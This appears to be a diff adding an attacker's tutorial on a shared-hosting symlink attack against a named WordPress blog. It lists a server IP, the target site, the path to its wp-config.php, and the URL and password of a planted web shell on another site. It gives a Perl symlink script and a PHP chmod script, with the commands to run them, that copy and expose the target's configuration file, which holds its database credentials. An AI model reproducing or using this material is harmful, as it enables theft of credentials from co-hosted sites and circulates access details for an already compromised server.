@@ -1,0 +1,54 @@
+Server Ip:64.14.68.37
+
+Target:www.rednosestudio.com/rednoseblog/
+RFD:http://www.rednosestudio.com/rednoseblog/wp-includes/rss-functions.php
+Config:/home/rednose/www/www/rednoseblog/wp-config.php
+Shell:http://ritaporfiris.com/site/youn1.php
+pass : 556851az**
+
+We create a Perl File call it example 'r00t.pl'
+
+We gonna use this Code to do symlink with perl :
+
+#!/usr/bin/perl
+symlink ("/home/rednose/www/www/rednoseblog/wp-config.php","/home/ritaporfiris/www/www/site/error/config.txt");
+
+
+
+*/home/rednose/www/www/rednoseblog/wp-config.php is our target config file
+
+*/home/ritaporfiris/www/www/site/error/config.txt is output config place
+
+*so we gonna retrieve our config as 'config.txt' , we can change extension to play with security ! like : .shtml,.log,.ini,.jpg,etc...
+and an .htaccess file is required to bypass reading the file that we retrieved.
+
+*So let's say that our file perl is called r00t.pl
+
+Now we gonna execute our perl file wich will do symlink from the Open Base_Dir Library , so like we are root user , sometimes
+less permission but still more better than doing it from the shell with the command 'ln -s'
+
+Command:/usr/bin/perl -d /home/ritaporfiris/www/www/site/error/r00t.pl
+
+*/usr/bin/perl is the perl library in the server
+
+*/home/ritaporfiris/www/www/site/error/r00t.pl is our perl wich we created
+
+Results: We will find our config file next step is just bypassing the config file , i noticed that we can rename our file to any extension
+this proof that we can do more and one more thing as u can see our perl code is a symlink method , maybe if we try another command
+not symlink maybe but all depends from the server security
+
+So let's move to another we gonna do it in another way and with PHP :
+
+so let's again create a php file called r00t.php same directory =>/home/ritaporfiris/www/www/site/error/r00t.php
+
+CODE PHP Script:
+
+<?
+chmod("config.txt" , 0755);
+?>
+
+As you can see we are manipulating the config file with the chmod function , this method works sometimes from Back Connect method
+
+Command:/usr/local/bin/php -d /home/ritaporfiris/www/www/site/error/r00t.php
+
+And there still a lot of ideas to do , this is just the main idea
